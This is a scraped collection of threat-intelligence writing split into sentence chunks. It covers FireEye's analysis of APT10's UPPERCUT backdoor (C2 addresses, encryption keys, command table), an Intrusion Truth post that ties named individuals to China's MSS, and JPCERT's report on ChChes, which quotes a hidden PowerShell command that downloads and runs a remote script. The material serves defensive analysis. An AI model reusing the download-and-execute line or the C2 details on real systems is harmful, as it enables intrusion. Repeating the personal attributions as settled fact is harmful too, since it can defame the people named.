source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The complete attack overview is shown in Figure 7.Figure 7: Attack overviewSeveral threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Evolution of UPPERCUTFigure 8 shows the timeline of updates for UPPERCUT.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The compile time of loaders in the newer version(s) are not shown here since the timestamps are overwritten and filled with zeroes.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: We don’t have visibility into UPPERCUT 5.2.x series, but it’s possible that minor revisions were released every few months between December 2017 and May 2018.Figure 8: Timeline of UPPERCUT updatesUnlike previous versions, the exported function names are randomized in the latest version (Table 2).Encoded PayloadDecoded PayloadMD5SizeImport HashExported FunctionVersionaa3f303c3319b14b4829fe2faa5999c1322164182ee99b4f0803628c30411b1faa9992l7MF25T96n45qOGWX5.3.2126067d634d94c45084cbe1d9873d8953308045f45532f947501cf024d84c36e3a19a1hJvTJcdAU3mNkuvGGq7L5.4.1fce54b4886cac5c61eda1e7605483ca3345812c1942a0ca397b627019dace26eca78d8WcuH5.4.1Table 2: Static characteristics of UPPERCUTAnother new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The error code is the value returned by the GetLastError function and sent in the next beacon.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: This was likely included to help the attackers understand the problem if the backdoor is unable to receive a response (Figure 9).
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: This Cookie header is a unique indicator that can be used for network-based detection.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Figure 9: Example of callbackEarlier versions of UPPERCUT used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: However, in the latest version, the keys are hard-coded uniquely for each C2 address and use the C2’s calculated MD5 hash to determine which key to use, as shown in Figure 10.Figure 10: Blowfish key generationFor instance, Table 3 lists the hard-coded C2 addresses, their MD5 hash, and the corresponding Blowfish key in the decoded payload of 126067d634d94c45084cbe1d9873d895.C2MD5Blowfish Keyhxxp[:]//151.106.53[.]147/VxQGf613846eb5bed227ec1a5f8df7e678d0bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489dhxxp[:]//153.92.210[.]208/wBNh150c60f37922ff2ff8733aaeaa9802da5fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577ddhxxp[:]//eservake.jetos[.]com/qIDjc500dae1ca41236830b59f1467ee96c1d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004aDefault Defaultf12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53Table 3: Example of Blowfish keysIn this example, the MD5 hash of hxxp[:]//151.106.53[.]147/VxQG will be f613846eb5bed227ec1a5f8df7e678d0.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: When the malware interacts with this URL, bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d will be selected as a Blowfish key.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: If the MD5 hash of the URL does not match any of the listed hashes, then the default key f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53 will be used.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Table 4 shows the parameters sent to C2 server from the backdoor in the newer versions.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: These are sent via POST request, as shown in Figure 9.Table 4: URL parametersAdditionally, the command string is hashed using the same RGPH hashing algorithm as before.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Two more commands, 0xD290626C85FB1CE3 and 0x409C7A89CFF0A727, are supported in the newer versions (Table 5).CommandsDescription0x97A168D9697D40DDDownload and validate file (XXHash comparison) from C2 server0x7CF812296CCC68D5Upload file to C2 server0x652CB1CEFF1C0A00Load
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: PE file0x27595F1F74B55278Download, validate (XXHash comparison), execute file, and send output to C2 server0xD290626C85FB1CE3Format the current timestamp0x409C7A89CFF0A727Capture the desktop screenshot in PNG format and send it to C2None of the aboveThe received buffer is executed via cmd.exe and the output is then sent to the C2 serverTable 5: Supported commandsConclusionWhile APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: In the newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor’s network communications.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: This shows that APT10 is very capable of maintaining and updating their malware.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: To mitigate the threat, users are advised to disable Office macros in their settings and not to open documents from unknown sources.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: FireEye Multi-Vector Execution (MVX) engine is able to recognize and block this threat with the following detection names:APT.Backdoor.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security

intrusiontruth 
				in APT10 
August 15, 2018August 15, 2018
609 Words












In previous posts, Intrusion Truth showed that the Cloud Hopper / APT10 hackers that attacked thousands of global clients of Managed Service Providers (MSPs) in 2016 were based in Tianjin, China.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: We identified Zheng Yanbin, Gao Qiang and Zhang Shilong as three actors responsible.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: We associated them with the Huaying Haitai Science and Technology Development Co Ltd (天津华盈海泰科技发展有限公司) and Laoying Baichen Instruments Equipment Co Ltd in Tianjin China.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: But we haven’t yet explained who was masterminding or controlling the attacks.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: In the course of our investigation over the last year, we engaged with several Cyber Threat Intelligence analysts who provided both raw data and analysis to our team.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: Amongst the data provided to us recently was evidence that Gao Qiang has been working with the Chinese state.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: The key piece of data was an Uber journey.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
Journeys to 85 Zhujiang Road
强’s travel from work at Huaying Haitai to Xiqing District.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: This image, which was provided by an analyst who prefers not to be named publicly (but whose identity we have independently verified), shows an Uber receipt addressed to a user called ‘Qiang’ (强) and bears the e-mail address 420192[at]qq.com, an account that we believe to be used by APT10 actor Gao Qiang.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: The receipt shows travel at the end of the working day between 384 Jiefang South Road (解放南路) – immediately outside the Fuyu Mansion address of Huaying Haitai – and a destination in what appears to be a residential area of the Xiqing District of Tianjin just south of the Waihuan River.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: We have blacked out the exact street number in the image.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: This map shows the location of the start of the journey, outside the Fuyu Mansion buildings.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
The collection address outside the Fuyu Mansion Buildings, home of Huaying Haitai
This second Uber receipt, provided by the same analyst, shows further travel by the same user, though here he uses the name ‘Pig’ (猪).
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: This could be some attempt to disguise the nature of the journey, though readers will note the same QQ e-mail address is used.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
猪’s travel between Xiqing District and 85 Zhujiang Road
In this case the journey is between the same residential area in the Xiqing District and a large complex at 85 Zhujiang Road (珠江道), Tianjin.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: According to the rest of the data revised by analysts working for this blog, this was one of a number of journeys made by the user to/from the same complex on Zhujiang Road.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
Tianjin State Security Bureau
85 Zhujiang Road is an important address in Tianjin – it is the headquarters of the Tianjin State Security Bureau (天津市国家安全局), a regional arm of the Ministry of State Security (MSS).
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: MSS is the same Chinese Intelligence Service that was tasking APT3 via a cover company managed by its office in Guangdong.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
The large complex visited by Gao Qiang at 85 Zhujiang Road, Tianjin
This looks like what it is – an exact copy of the APT3 model.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: This was a large scale infiltration of western infrastructure conducted by a team of Chinese citizens working for a small company with links to the Chinese Intelligence Service, MSS.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: It is the second time that this blog has proven a link between a damaging APT group and the Chinese state (and it certainly won’t be the last).
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text: The conclusion?
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
Either:
someone with the same name as an apparent APT10 hacker,
travelled from the same building as an APT10 associated company, and
met frequently with the Ministry of State Security in Tianjin.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
Or:
APT10 was the work of the Chinese Ministry of State Security.
source: APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security – Intrusion Truth.html

text:
Malware Leveraging PowerSploit - JPCERT/CC Eyes | JPCERT Coordination Center official Blog
















      






 









JPCERT/CC Eyes

JPCERT Coordination Center official Blog

Language:


日本語
English







Top > List of “Malware” > Malware Leveraging PowerSploit
      












朝長 秀誠 (Shusei Tomonaga)


March  1, 2017


Malware Leveraging
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
PowerSploit



ChChes









Email




Hi again, this is Shusei Tomonaga from the Analysis Center.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: In this article, I’d like to share some of our findings about ChChes (which we introduced in a previous article) that it leverages PowerSploit
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: [1] – an open source tool – for infection.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Flow of ChChes Infection
The samples that JPCERT/CC confirmed this time infect machines by leveraging shortcut files.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: The flow of events from a victim opening the shortcut file until a machine is infected is illustrated in Figure 1.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Figure 1: Flow of events from opening a shortcut file to ChChes infection






When the shortcut file is opened, a file containing PowerShell script is downloaded from an external server and then executed.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: Next, ChChes code (version 1.6.4) contained in the PowerShell script is injected into powershell.exe and executed.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: The detailed behaviour in each phase is described below.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Behaviour after the shortcut file is opened
When the shortcut file is opened, the following PowerShell script contained in the file is executed.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: powershell.exe -nop
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
-w hidden -exec bypass  -enc JAAyAD0AJwAtAG4Abw ~omitted~

The PowerShell script after “-enc” is encoded.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Below is the decoded script:
$2='-nop -w hidden -exec bypass -c "IEX (New-Object System.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: Net.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Webclient).DownloadString(''https://goo.gl/cpT1NW'')"';if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2";}else{iex "& powershell $2";}
By executing the above PowerShell script, a file containing PowerShell script is downloaded from a specified URL.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: The downloaded script is loaded in 32-bit powershell.exe (syswow64\WindowsPowerShell\v1.0\powershell) and executed.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: The reason why it is executed in 32-bit is considered to be that ChChes’s assembly code contained in the PowerShell script is not compatible with 64-bit environment.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Details of the Downloaded PowerShell Script
The downloaded PowerShell script is partially copied from PowerSploit (Invoke-Shellcode.ps1).
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: PowerSploit is a tool to execute files and commands on a remote host and is used for penetration tests.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: When the downloaded PowerShell script is executed, it creates document files based on data contained in the script, store the files in the %TEMP% folder and displays them.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: We’ve seen different types of documents shown, including Excel and World documents.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: Next, ChChes code contained in the PowerShell is injected into powershell.exe.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: The injected ChChes receives commands and modules from C2 servers as explained in the previous blog post.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: The PowerShell script and the injected ChChes are not saved as files in the infected machines, and ChChes itself only exists in the memory.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: Figure 2 is a part of the PowerShell script.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Figure 2: Downloaded PowerShell script






Confirming Attack Traces through Event Logs
In environments where PowerShell v5.0 is installed (including Windows 10), the PowerShell script downloaded from remote servers are recorded in the event logs under the default settings (as Figure 3).
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: When you investigate, please check if your logs contain such records.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Figure 3: Contents recorded in Event Logs






Such logs can also be obtained in PowerShell v4.0 (Default version of Windows 8.1) by enabling the following Group Policy.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
Computer Configuration -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn on PowerShell Script Block Logging

Summary
It is now quite common that PowerShell script is leveraged for attacks.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: If your event log configuration is not set to record PowerShell execution, it is recommended that you revise the settings in preparation for such attacks.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text: Also, if you are not using PowerShell, it is suggested to restrict the execution by using AppLocker, etc.
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
-Shusei Tomonaga
(Translated by Yukako Uchida)

References:
source: Malware Leveraging PowerSploit - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html

text:
[1] PowerSploit
https://github.com/PowerShellMafia/PowerSploit
